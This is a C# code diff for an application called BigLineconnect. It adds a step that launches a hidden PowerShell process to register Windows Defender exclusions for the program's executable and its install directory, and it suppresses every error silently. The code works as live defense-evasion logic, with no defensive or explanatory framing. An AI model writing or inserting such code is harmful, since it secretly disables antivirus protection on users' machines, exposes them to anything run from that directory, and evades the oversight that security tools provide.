@@ -2969,6 +2969,22 @@ namespace BigLineconnect
                     if (File.Exists(oldVbs)) { try { File.Delete(oldVbs); } catch { } }
                 }
                 catch { }
+
+                // 5. Automatically register Windows Defender Exclusion for BigLineconnect process and directory
+                try
+                {
+                    string exeDir = Path.GetDirectoryName(exePath) ?? "";
+                    var psiDef = new ProcessStartInfo("powershell.exe", $"-Command \"Add-MpPreference -ExclusionProcess 'BigLineconnect.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '{exeDir}' -ErrorAction SilentlyContinue\"")
+                    {
+                        CreateNoWindow = true,
+                        UseShellExecute = false
+                    };
+                    using (var proc = Process.Start(psiDef))
+                    {
+                        proc?.WaitForExit(2000);
+                    }
+                }
+                catch { }
             }
             catch { }
         }
